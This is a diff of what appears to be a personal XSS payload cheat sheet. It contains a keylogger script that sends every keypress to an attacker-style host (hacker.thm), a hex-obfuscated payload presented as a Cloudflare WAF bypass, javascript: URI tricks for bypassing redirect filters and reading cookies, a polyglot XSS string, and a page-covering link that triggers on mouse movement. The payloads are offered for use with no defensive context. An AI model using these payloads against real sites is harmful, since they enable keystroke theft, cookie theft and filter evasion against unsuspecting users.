@@ -26,7 +26,31 @@ Key Logger:
 <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
 
 
+------------------------------------------------------------------------------
 
+-------------Use this:---------------
+
+javascript:printCurrentPage() 
+
+
+Cloudflare XSS bypass:
+
+<DiV sTylE="WidTH:100&#37;;HeIgHt:100vH&#59;" oNpOINteROvEr="var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);"></dIV>
+
+---------------------------------------------------------------------
+
+For redirect bypass:
+
+%09Jav%09ascript:alert(document.cookie)
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+---------------------------------------------------------------------
+For Href without user interaction:
+
+<a style="display: block; position: fixed; top: 0; left: 0; z-index: 99999; width: 9999px; height: 9999px;" onmouseover="alert('xss')">
+
+----------------------------------------------------------------------
 
 
 
